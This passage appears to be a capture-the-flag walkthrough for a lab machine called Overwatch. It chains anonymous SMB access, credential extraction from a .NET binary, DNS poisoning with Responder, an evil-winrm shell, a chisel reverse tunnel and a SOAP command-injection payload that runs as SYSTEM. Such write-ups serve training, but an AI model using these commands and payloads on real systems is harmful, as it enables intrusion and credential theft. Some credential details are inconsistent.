<td>WinRM</td>
<td>Remote shell (evil-winrm)</td>
</tr>
<tr>
<td>6520</td>
<td>MSSQL</td>
<td>SQL Server on non-standard port</td>
</tr>
</tbody></table>
<blockquote>
<p><strong>Why this matters:</strong> Seeing Kerberos (88), LDAP (389), and DNS (53) together tells you immediately this is a <strong>Domain Controller</strong>. MSSQL on a non-standard port (6520 instead of 1433) is unusual — worth investigating.</p>
</blockquote>
<hr />
<h2 id="phase-2-smb-enumeration">Phase 2 — SMB Enumeration</h2>
<h3 id="list-shares">List shares</h3>
<pre><code class="language-bash" data-language="bash">smbclient -L //10.129.30.5 -N
</code></pre>
<p><strong>Found:</strong> <code>software$</code> share — accessible <strong>anonymously</strong> (no password required).</p>
<blockquote>
<p><strong>Why this matters:</strong> <code>$</code> shares are usually hidden admin shares. An accessible one with no auth is REDACTED misconfiguration. Always check SMB null sessions on Windows boxes.</p>
</blockquote>
<h3 id="browse-and-grab-files">Browse and grab files</h3>
<pre><code class="language-bash" data-language="bash">smbclient //10.129.30.5/software$ -N
smb: \&gt; cd Monitoring
smb: \Monitoring\&gt; get overwatch.exe
smb: \Monitoring\&gt; get overwatch.exe.config
</code></pre>
<p><strong>What we got:</strong></p>
<ul>
<li><code>overwatch.exe</code> — a .NET monitoring application (WCF service)</li>
<li><code>overwatch.exe.config</code> — XML config revealing the WCF endpoint:
<code>http://overwatch.htb:8000/MonitorService</code></li>
</ul>
<blockquote>
<p><strong>Why this matters:</strong> Developers often leave compiled binaries on shares. .NET binaries are <strong>not obfuscated by default</strong> — they are trivially reversible and often contain hardcoded secrets.</p>
</blockquote>
<hr />
<h2 id="phase-3-extract-credentials-from-binary">Phase 3 — Extract Credentials from Binary</h2>
<p>.NET strings are stored in <strong>UTF-16 Little Endian</strong> format, not ASCII. The <code>strings</code> command without flags won't find them.</p>
<pre><code class="language-bash" data-language="bash">strings -el overwatch.exe | grep -iE "password|sqlsvc|Server="
</code></pre>
<p><strong>Result:</strong></p>
<p>Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=REDACTED;</p>
<blockquote>
<p><strong>Why <code>-el</code>?</strong> The <code>-e l</code> flag tells <code>strings</code> to look for 16-bit little-endian characters — exactly how .NET embeds string literals in compiled IL bytecode.</p>
</blockquote>
<blockquote>
<p><strong>Key Takeaway:</strong> Never hardcode credentials in source code or compiled binaries. <code>strings -el</code> is the fastest way to extract secrets from .NET assemblies without installing anything.</p>
</blockquote>
<p><strong>Credentials found:</strong>
sqlsvc : TI0LKcfHzZw1Vv</p>
<hr />
<h2 id="phase-4-mssql-login-and-linked-server-discovery">Phase 4 — MSSQL Login &amp; Linked Server Discovery</h2>
<h3 id="connect-to-mssql">Connect to MSSQL</h3>
<pre><code class="language-bash" data-language="bash">impacket-mssqlclient 'overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@10.129.30.5' \
  -port 6520 -windows-auth
</code></pre>
<blockquote>
<p><strong>Why <code>-windows-auth</code>?</strong> The credential is REDACTED <strong>domain account</strong> (<code>OVERWATCH\sqlsvc</code>), not a SQL local login. Windows Authentication uses Kerberos/NTLM, not SQL's built-in auth.</p>
</blockquote>
<h3 id="check-privileges">Check privileges</h3>
<pre><code class="language-sql" data-language="sql">SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
-- Result: sqlsvc, 0  (guest-level, NOT sysadmin — no xp_cmdshell)
</code></pre>
<h3 id="enumerate-linked-servers">Enumerate linked servers</h3>
<pre><code class="language-sql" data-language="sql">EXEC sp_linkedservers;
-- or
SELECT name, data_source FROM sys.servers;
</code></pre>
<p><strong>Result:</strong></p>
<p>S200401\SQLEXPRESS (local)<br />SQL07 (linked — another SQL Server)</p>
<blockquote>
<p><strong>Why this matters:</strong> SQL Server <strong>Linked Servers</strong> allow one SQL instance to query another. When you run a query against a linked server, the local server authenticates to the remote one — often using a <strong>service account with a stored plaintext password</strong>. This is the attack surface.</p>
</blockquote>
<hr />
<h2 id="phase-5-dns-poisoning-responder-cleartext-password-capture">Phase 5 — DNS Poisoning + Responder = Cleartext Password Capture</h2>
<p>This is the most interesting part. Here's the logic:</p>
<ol>
<li><code>SQL07</code> is a linked server — the name resolves via <strong>Active Directory DNS</strong></li>
<li><code>sqlsvc</code> is in the <strong>DnsAdmins</strong> group (has permission to add DNS records)</li>
<li>We add a <strong>fake DNS A record</strong> for <code>sql07</code> → pointing to <strong>our Kali IP</strong></li>
<li>We start <strong>Responder</strong> to listen for MSSQL authentication on our IP</li>
<li>We trigger the linked server → the DC tries to auth to "SQL07" (our machine) → Responder captures the <strong>cleartext password</strong> of whatever account the linked server uses to authenticate</li>
</ol>
<h3 id="step-1-add-malicious-dns-record">Step 1: Add malicious DNS record</h3>
<pre><code class="language-bash" data-language="bash">git clone https://github.com/dirkjanm/krbrelayx.git
cd krbrelayx

python3 dnstool.py \
  -u 'OVERWATCH\sqlsvc' -p 'TI0LKcfHzZw1Vv' \
  -r sql07 -a add -t A -d 10.10.16.155 \
  10.129.30.5
</code></pre>
<p><strong>Verify it was added:</strong></p>
<pre><code class="language-bash" data-language="bash">python3 dnstool.py \
  -u 'OVERWATCH\sqlsvc' -p 'TI0LKcfHzZw1Vv' \
  -r sql07 -a query \
  10.129.30.5
# Should show: Address 10.10.16.155
</code></pre>
<h3 id="step-2-start-responder">Step 2: Start Responder</h3>
<pre><code class="language-bash" data-language="bash">sudo responder -I tun0 -w
</code></pre>
<blockquote>
<p><strong>What is Responder?</strong> It impersonates network services (MSSQL, SMB, HTTP, etc.) and captures credentials when clients try to authenticate. Since MSSQL linked servers can use cleartext auth, the password comes in unencrypted.</p>
</blockquote>
<h3 id="step-3-trigger-the-linked-server-query">Step 3: Trigger the linked server query</h3>
<p>In your MSSQL session:</p>
<pre><code class="language-sql" data-language="sql">SELECT * FROM OPENQUERY(SQL07, 'SELECT 1');
</code></pre>
<h3 id="result-in-responder">Result in Responder</h3>
<p>[MSSQL] Cleartext Client : 10.129.30.5<br />[MSSQL] Cleartext Hostname : SQL07<br />[MSSQL] Cleartext Username : sqlmgmt<br />[MSSQL] Cleartext Password : null</p>
<blockquote>
<p><strong>Key Takeaway:</strong> Linked servers that use cleartext MSSQL authentication are a critical misconfiguration. Combined with DnsAdmins group membership allowing DNS record manipulation, this is a devastating credential capture chain.</p>
</blockquote>
<p><strong>New credentials:</strong>
sqlmgmt : bIhBbzMMnB82yx</p>
<hr />
<h2 id="phase-6-winrm-shell-user-txt">Phase 6 — WinRM Shell → user.txt</h2>
<pre><code class="language-bash" data-language="bash">evil-winrm -i 10.129.30.5 -u sqlmgmt -p REDACTED
</code></pre>
<pre><code class="language-powershell" data-language="powershell">type C:\Users\sqlmgmt\Desktop\user.txt
# 6f70b[redacted]379614ba8
</code></pre>
<blockquote>
<p><strong>Why does this work?</strong> Port 5985 (WinRM) was open and <code>sqlmgmt</code> is a domain user with WinRM access. <code>evil-winrm</code> is a Ruby-based WinRM client that gives a full interactive shell.</p>
</blockquote>
<hr />
<h2 id="phase-7-chisel-tunnel-expose-internal-port-8000">Phase 7 — Chisel Tunnel (Expose Internal Port 8000)</h2>
<p>The WCF monitoring service (<code>overwatch.exe</code>) runs on <strong>localhost:8000</strong> — not exposed externally. We need to tunnel it through our evil-winrm session.</p>
<h3 id="on-kali-start-chisel-server">On Kali — start chisel server</h3>
<pre><code class="language-bash" data-language="bash"># Find chisel (pre-installed on Kali)
which chisel || apt install chisel -y

chisel server -p 9001 --reverse
</code></pre>
<h3 id="in-evil-winrm-upload-and-run-chisel-client">In evil-winrm — upload and run chisel client</h3>
<pre><code class="language-powershell" data-language="powershell">upload /usr/bin/chisel C:\Windows\Temp\chisel.exe

C:\Windows\Temp\chisel.exe client 10.10.16.155:9001 R:8000:127.0.0.1:8000
</code></pre>
<blockquote>
<p><strong>How chisel works:</strong> The target connects <strong>outbound</strong> to our server on port 9001 (<code>--reverse</code>). It then creates a tunnel so that our port 8000 on Kali forwards into the target's <code>localhost:8000</code>. This bypasses firewall rules that block inbound connections.</p>
</blockquote>
<h3 id="add-dns-to-etc-hosts-on-kali">Add DNS to /etc/hosts on Kali</h3>
<pre><code class="language-bash" data-language="bash">sudo sh -c 'echo "127.0.0.1 overwatch.htb" &gt;&gt; /etc/hosts'
</code></pre>
<h3 id="verify-the-tunnel-works">Verify the tunnel works</h3>
<pre><code class="language-bash" data-language="bash">curl -s http://overwatch.htb:8000/MonitorService | head -3
# Should return HTML/XML — WCF service page visible
</code></pre>
<hr />
<h2 id="phase-8-wcf-killprocess-command-injection-root-txt">Phase 8 — WCF KillProcess Command Injection → root.txt</h2>
<h3 id="understanding-the-vulnerability">Understanding the vulnerability</h3>
<p>The <code>overwatch.exe.config</code> revealed the WCF service exposes three operations:</p>
<ul>
<li><code>StartMonitoring</code></li>
<li><code>StopMonitoring</code></li>
<li><code>KillProcess</code> ← <strong>vulnerable</strong></li>
</ul>
<p><code>KillProcess</code> takes a <code>processName</code> string and passes it unsanitized to <code>Stop-Process</code> or a <code>cmd.exe</code> call on the server. This is a classic <strong>command injection</strong> — the semicolon <code>;</code> separates commands in PowerShell.</p>
<p>The service runs as <code>NT AUTHORITY\SYSTEM</code> (no reason to drop privileges for a monitoring service), so any injected command runs as <strong>SYSTEM</strong>.</p>
<h3 id="craft-the-soap-payload">Craft the SOAP payload</h3>
<pre><code class="language-bash" data-language="bash">cat &gt; /tmp/kill.xml &lt;&lt; 'EOF'
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xmlns:xsd="http://www.w3.org/2001/XMLSchema"
               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;
  &lt;soap:Body&gt;
    &lt;KillProcess xmlns="http://tempuri.org/"&gt;
      &lt;processName&gt;notepad; type C:\Users\Administrator\Desktop\root.txt&lt;/processName&gt;
    &lt;/KillProcess&gt;
  &lt;/soap:Body&gt;
&lt;/soap:Envelope&gt;
EOF
</code></pre>
<blockquote>
<p><strong>Why <code>notepad;</code>?</strong> We need a valid process name first to avoid an early error before our injection runs. <code>notepad</code> is a safe dummy — even if it's not running, the service continues and executes what follows the <code>;</code>.</p>
</blockquote>
<h3 id="send-the-soap-request">Send the SOAP request</h3>
<pre><code class="language-bash" data-language="bash">curl -s \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: http://tempuri.org/IMonitoringService/KillProcess" \
  --data @/tmp/kill.xml \
  http://overwatch.htb:8000/MonitorService
</code></pre>
<h3 id="response">Response</h3>
<pre><code class="language-xml" data-language="xml">&lt;KillProcessResponse xmlns="http://tempuri.org/"&gt;
  &lt;KillProcessResult&gt;[redacted retired-lab hash or flag]&lt;/KillProcessResult&gt;
&lt;/KillProcessResponse&gt;
</code></pre>
<p><strong>root.txt:</strong> <code>5a5001[redacted]bb4c8e0ee</code> </p>
<blockquote>
<p><strong>Key Takeaway:</strong> <code>&amp;#xD;</code> in XML is just a carriage return <code>\r</code> — not part of the flag. WCF services with <code>includeExceptionDetailInFaults="True"</code> and no authentication are trivially exploitable — the WSDL/MEX endpoint advertises every available method to anyone.</p>
</blockquote>

<h2 id="credential-chain">Credential Chain</h2>
<pre><code>[Anonymous SMB]  
↓  
overwatch.exe (strings -el)  
↓  
sqlsvc : TI0LKcfHzZw1Vv  
↓  
MSSQL port 6520 → Linked Server SQL07  
↓

↓  
sqlmgmt : bIhBbzMMnB82yx  
↓

↓

</code></pre>
<hr />
<h2 id="key-takeaways">Key Takeaways</h2>
<ol>
<li><p><strong><code>strings -el</code> for .NET binaries</strong> — always run this before installing any decompiler. UTF-16 LE strings are invisible to plain <code>strings</code>.</p>
</li>
<li><p><strong>SMB null sessions</strong> — anonymous read access to a non-default share is always worth exploring. Developers leave binaries with hardcoded secrets in "internal" shares.</p>
</li>
<li><p><strong>MSSQL Linked Servers = credential theft surface</strong> — when a linked server uses cleartext MSSQL auth, poisoning the DNS record for the linked server name forces the authentication to your machine.</p>
</li>
<li><p><strong>DnsAdmins = underrated privilege</strong> — members can add arbitrary DNS records to AD DNS. This alone enables the entire Phase 5 attack.</p>
</li>
<li><p><strong>WCF services with no auth + <code>KillProcess</code></strong> — any service that executes OS commands based on user-supplied input without sanitization is RCE. Running such a service as SYSTEM makes it an instant root.</p>
</li>
<li><p><strong>Chisel reverse tunnels</strong> — when a port is only listening on localhost internally, reverse port forwarding via an existing shell (evil-winrm) exposes it without firewall issues.</p>
</li>
<li><p><strong>No reverse shell needed</strong> — the WCF response body returned the flag directly. Always check if the service echoes output before going through the effort of a full reverse shell.</p>
</li>
</ol>
